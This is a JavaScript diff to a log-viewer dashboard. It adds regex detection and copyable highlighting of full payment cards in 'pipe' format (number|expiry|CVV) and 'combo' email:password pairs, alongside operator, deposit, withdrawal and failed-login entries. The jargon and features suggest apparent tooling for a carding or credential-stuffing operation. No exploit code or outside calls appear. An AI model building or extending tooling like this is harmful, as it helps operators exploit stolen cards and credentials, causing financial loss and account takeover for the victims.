@@ -2442,8 +2442,9 @@ function _renderCardTouchLine(p, kv) {
   const hasAccount = kv.account && !kv.account.startsWith('N/A');
   const chips = [];
   if (kv.operator) chips.push(_chip('chip-op', '👤', kv.operator));
-  if (hasAccount) chips.push(_chip('chip-account', '📧', kv.account, { nav: true }));
-  if (kv.pipe) chips.push(_chip('chip-pipe', '💳', kv.pipe));
+  if (kv.combo) chips.push(_chip('chip-combo', '🔑', kv.combo, { nav: hasAccount }));
+  else if (hasAccount) chips.push(_chip('chip-account', '📧', kv.account, { nav: true }));
+  if (kv.pipe) chips.push(_chip('chip-pipe chip-pipe-full', '💳', kv.pipe));
   if (kv.amount) chips.push(_chip('chip-amt', '', kv.amount));
   const tail = esc([kv.status, kv.reason].filter(Boolean).join(' · '));
   const navAttr = hasAccount ? ` data-nav-account="${esc(kv.account)}"` : '';
@@ -2473,12 +2474,25 @@ function _renderLogLine(p) {
     safeMsg = safeMsg.replace(/\[DETAILS\]\s*/i, '');
     safeMsg = safeMsg.replace(/(Balance:\s*[\d\.,]+)/i, '<span class="log-balance">$1</span>');
   }
-  // Email suelto en líneas de dominio (depósito/retiro/login) → chip copiable
-  // + click-through a la cuenta. No se reescribe nada más del mensaje.
-  const emailM = p.msg.match(/([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})/);
-  if (emailM && (cat === 'deposit_ok' || cat === 'deposit_fail' || cat === 'withdraw_ok' || cat === 'withdraw_fail' || cat === 'login_fail')) {
-    safeMsg = safeMsg.replace(esc(emailM[1]), _chip('chip-account', '📧', emailM[1], { nav: true }));
+
+  // Detectar y resaltar Tarjeta Completa en formato Pipe: 15-16 dígitos|MM|YYYY|CVV o 15-16 dígitos|MMYY|CVV
+  const pipeMatch = p.msg.match(/\b(\d{15,16}\|(?:\d{2}\|\d{2,4}|\d{4})\|\d{3,4})\b/);
+  if (pipeMatch) {
+    safeMsg = safeMsg.replace(esc(pipeMatch[1]), _chip('chip-pipe chip-pipe-full', '💳', pipeMatch[1]));
   }
+
+  // Detectar y resaltar Combo Completo email:password
+  const comboMatch = p.msg.match(/\b([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}:[^\s|]+)\b/);
+  if (comboMatch) {
+    safeMsg = safeMsg.replace(esc(comboMatch[1]), _chip('chip-combo', '🔑', comboMatch[1]));
+  } else {
+    // Email suelto en líneas de dominio → chip copiable
+    const emailM = p.msg.match(/([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})/);
+    if (emailM && (cat === 'deposit_ok' || cat === 'deposit_fail' || cat === 'withdraw_ok' || cat === 'withdraw_fail' || cat === 'login_fail' || p.msg.includes('BEGIN_DEPOSIT') || p.msg.includes('LOGIN'))) {
+      safeMsg = safeMsg.replace(esc(emailM[1]), _chip('chip-account', '📧', emailM[1], { nav: true }));
+    }
+  }
+
   const isRefresh = cat === 'refresh';
   return `<span class="${lineCls}${isRefresh ? ' is-refresh' : ''}"><span class="log-ts">${esc(shortTs)}</span>${catBadge}<span class="log-level ${cls}">${esc(lvl)}</span><span class="log-logger">${esc(shortLog)}</span><span class="log-msg">${safeMsg}</span></span>`;
 }
